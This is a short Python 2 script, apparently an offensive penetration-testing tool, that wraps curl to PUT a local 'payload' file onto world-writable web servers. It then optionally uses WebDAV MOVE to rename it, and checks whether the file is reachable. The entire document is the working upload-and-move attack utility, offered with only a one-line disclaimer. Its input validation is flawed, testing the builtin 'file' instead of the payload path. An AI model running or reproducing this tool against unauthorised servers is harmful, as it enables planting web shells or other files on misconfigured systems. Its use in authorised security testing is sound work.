#!/usr/bin/python

# HTTP PUT
# A simple curl wrapper for PUT and MOVE http methods on world-writable Webservers.
#
# Written by: james@forscience.xyz
#
# ** No permission is given for the use of this script for unlawful purposes.

import sys, subprocess, os.path

# Print the title
print(
'''
       _   _ _____ _____ ____              _   
      | | | |_   _|_   _|  _ \ _ __  _   _| |_ 
      | |_| | | |   | | | |_) | '_ \| | | | __|
      |  _  | | |   | | |  __/| |_) | |_| | |_ 
      |_| |_| |_|   |_| |_|   | .__/ \__,_|\__|
                              |_|              

       	  [!] httpput.py (a curl wrapper)
              PUT and MOVE files on a WebServer!

	  [@] forScience

------------------------------------------------------------
'''
     )

# ctrl+c and quit
def goodbye():
        sys.exit("\n[!] Quitting...\n")

# Get and validate user input
def user_input():
	attempt = 0
	try:
		while (attempt < 3):

			global server
			server = str(raw_input("[+] Enter the WebServer Address: "))
			server = "http://" + server

			global port
			port = raw_input("[+] Enter the Port number: ")

			global payload
			payload = str(raw_input("[+] Enter local file to upload: "))

			global dir
                        dir = str(raw_input("[+] Enter directory/file-name to upload to (/<file>): "))

			# Check the payload actually exists
			if server == '' or port == '' or file == '' or dir == '':
				print("[!] Incorrect Input(s). RETRY!\n")
				attempt = attempt + 1
				continue

			elif os.path.isfile(payload):
                                break
                        else:
                                print("[!] Local File does not exist\n")
                                attempt = attempt + 1

		else:
			goodbye()

	except KeyboardInterrupt:
		goodbye()


# Check if the HTTP method worked
def check_success(dest):
        try:

		global methodFailure

                # Open the file and read first line, check if the file is on the server
                print("\n[!] Checking for the file on the server ...")

		try:
                	checkPut = subprocess.check_output(["curl", dest, "--head", "--silent"])

                	if "200 OK" in checkPut:
	                	print("[!] Woo! It worked! File found at " + dest)

				methodFailure = False

			else:
                		print("\n[!] Boo! It failed. " + dest + " not found")

				methodFailure = True

		except subprocess.CalledProcessError:
			print("\n[!] Processing Error. Check the file path for mistakes: (" + dest + ").")

			methodFailure = True

		print("____________________________________________________________\n")

        except KeyboardInterrupt:
                goodbye()


# PUT the file to the server
def put_method():
        try:
		global putDest
                putDest = server + dir # Where is it going?

                print("____________________________________________________________")

                print("\n[!] PUT'ting to " + putDest + " ...")

		# PUT with all output to /dev/null
		with open(os.devnull, 'w') as FNULL:
			subprocess.call(["curl", putDest, "--upload-file", payload, "--silent"], stdout=FNULL, stderr=FNULL)

		check_success(putDest)

	except KeyboardInterrupt:
		goodbye()


# Move the file to a new destination
def move_method():
        try:
                askMove = raw_input("[+] Do you want to MOVE the file? (y/n): ")

                if askMove == 'y':
                        moveDest = raw_input("[+] Enter the new destination: ")
                        checkMove = server + moveDest
                        moveDest = "Destination:" + server + moveDest

			print("\n[!] MOVE'ing to " + checkMove + " ...")

			# MOVE with all output to /dev/null
			with open(os.devnull, "w") as FNULL:
                        	subprocess.call(["curl", "-X", "MOVE", "--header", moveDest, putDest], stdout=FNULL, stderr=FNULL)
                else:
                        goodbye()

		check_success(checkMove)

        except KeyboardInterrupt:
                goodbye()


# Begin
user_input()
put_method()

if methodFailure == False:
	move_method()
